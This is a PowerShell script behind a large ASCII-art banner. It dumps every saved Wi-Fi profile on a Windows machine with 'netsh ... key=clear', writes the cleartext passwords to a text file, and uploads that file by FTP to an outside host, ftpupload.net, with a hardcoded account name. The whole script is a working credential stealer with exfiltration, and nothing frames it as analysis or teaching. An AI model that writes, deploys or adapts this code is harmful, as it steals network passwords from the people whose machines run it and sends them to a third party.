#Creator: Bulent Sahin 69
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8


$banner = @"
     .!~!~!~!!!!~!.  ..!~!^  . . . ^!~!. .!~!^  . . .... ..!~!~!~!!!!!!~!. .!~!~!^  . . ^!~!. .!~!~!~!~!!!!~!~!.        
     !@@@@@@@@@@@@J~.^J@@@#!:~:^:^:B@@@P~7@@@&!:^:^:^^^^:^J@@@@@@@@@@@@@@Y~J@@@@@&!:^:^:#@@@5~?@@@@@@@@@@@@@@@@P!       
     ~@&@#~!!!!!#@#&7.7@&@B^:^:^:^:G@&@J^7@&@#^:^:^:^^^^:^?@&@#~!!!!!!7!7^~J@&@&@&#G:.^:B@&@?^:577!!7@@@@7!!7~7^!       
     ~@&@#!!^^^^#@&&J~?@&@B^:^:^:^:G@&@J^7@&@#^:^:^:^^^^:^?@&@B!!^^^^...:::?@&@&&#@&?!:.B@&@?^ :.:.:^@@@@~!.:.:.^       
     ~@&@&@&@&@@@@?^:!7@&@B^:^:^:^:G@&@J^7@&@#^:^:^:^^^^:^?@&@&@&@&@@!.::::J@&@G:!@@@&~.B@&@?^.^.^.^:@@@@~::::::^       
     ~@&@&5Y5555&@PP: !@&@B^:^:^:^:G@&@J^7@&@#^:^:^:^::^:^?@&@&5Y5555~~:^:^J@&@G^^GG@@PY#@&@?^:^:~:~^@@@@~^:^:^:~.      
     ~@&@#:^::::#@@@5~7@&@B::^:^:^:G@&@J:7@&@#::^:^:^::^::?@&@B:^::::^^::::J@&@G^..~@@@@@@&@?^:^:~:^^@@@@~^:^:^:^       
     ~@&@&#BBBBB&@Y!^!.Y5@&#B######&@J!^!7@&@&#B######B&7.7@&@&&BBGBBGBB&7.?@&@B^.:.7J&@@@@@J^:^:~:^^@@@@~^:^:^:^       
     ^@#&#&#&#&&#&7!:: .!&#&#&#&##&#&!!::~@#&#&#&##&#&#&J!!@#&#&#&#&&#&#&?~7@#&5^:~..:B&###&7^:^:~:^:&###^^:^:^:^       
      !~^^^^^^^^^^^!.^:^.!~^^^^^^^^:^^!.^.!~^^^^^^^^^^:~^7 7^^^^^^^^^^^:^^7 7^^:7:~:^.:7^^:^^7:~:~:~.^!^^~~:^^^:~.      
                    ....                .                                         ....         .....       ......       
                                                                                                                        
     ^#G#G#B#BB#B#B#7 ~#G#5. :.GBB#B#B#B#B#5..#B#BB#BBG#G#B#B#5..BBBB: ..?#G#B#B#B#B#B: ..J#G#?.                        
     ~@@@&&######&#&?!?@&@#!:7~@@&##&#&B&B&P!^&#####&@@@&&B&B&P!^@@@@7~~!G@&&B&B&#&###!~::G@@@P7.                       
     ~@&@#.^:::::^:^:!7@&@B:^@@@@:^:^:^:^:^:!.^!:^:^#@&@?^:^:^:!^@@@@~:G@&@J^:^:^:::::~~::P@&@Y^                        
     ~@&@&P5JJJJ. ....7@&@B^:PP@@PP?J?Y?Y~  :.......B@&@?~...:...@@@@~:G@&@J~.:...J?JJ. ::P@&@Y^                        
     ~@&@&@@@@@@?~:^:^?@&@B^..^&@@@@@@@@@G7.^:~:~:^:B@&@?^:~:~:~^@@@@~:G@&@J^:~:~^@@@@7^::P@&@Y^                        
     ~@&@#^~~~~~^~:^:^?@&@B^::.~?~~^~^~5@&&P:.~:^:^:B@&@?^:^:~:^^@@@@~:G@&@J^.^.^.7?@@&&~.P@&@Y^                        
     ~@&@#^^...::.:^:^?@&@B^:7~:~^~^~^~5@&#5!:^:^:^:B@&@?^:^:~:^^@@@@~:5&&@57~7~7^^!@@##!~P@&@Y^                        
     ~@@@#^:^:^:^::^:^?@@@#^^@@@@@@@@@@@@5:^!:^:^:^:#@@@J^:^:~:^^@@@@~^.!G@@@@@@@@@@@@^~^~P@@@5^                        
     .GYY7^:^:^:^^^^:^^GJY7~:55JJJJJY?Y?Y~!...~:^:^:?GJY~~:^:~:~:55JJ^^..~GJY?Y?Y?JJJJ^~..!GJY~~^:                      
      ::::~.^:^:^::^:^ ::::~..^::::::.:.::~.~:^:^:^: ^:::~.^:^:~..^::^::^ ^:::::::::::^::^ ^:::^7? 
    
"@
Write-Host $banner -ForegroundColor Cyan

$ftpUser = "if0_40779427"
$ftpPass = $env:FTP_PASS

if (-not $ftpPass) {
    Write-Error "FTP_PASS ortam degiskeni ayarli degil!"
    exit 1
}

$localFile = "$env:USERPROFILE\wifipass.txt"

Remove-Item -Path $localFile -ErrorAction SilentlyContinue

$profiles = netsh wlan show profiles | ForEach-Object {
    if ($_ -match ":\s(.+)$") {
        $matches[1].Trim()
    }
}

foreach ($profile in $profiles) {
    Add-Content -Path $localFile -Value "=== $profile ===`n"

    $profileDetail = netsh wlan show profile name="$profile" key=clear
    Add-Content -Path $localFile -Value $profileDetail
    Add-Content -Path $localFile -Value "`n`n"
}


$ftpUrl = "ftp://ftpupload.net/wifipass.txt"

$webclient = New-Object System.Net.WebClient
$webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)

try {
    $webclient.UploadFile($ftpUrl, "STOR", $localFile)
    Write-Host "Dosya basariyla FTP sistemine yuklendi."
}
catch {
    Write-Host "Hata olustu: $_"
}
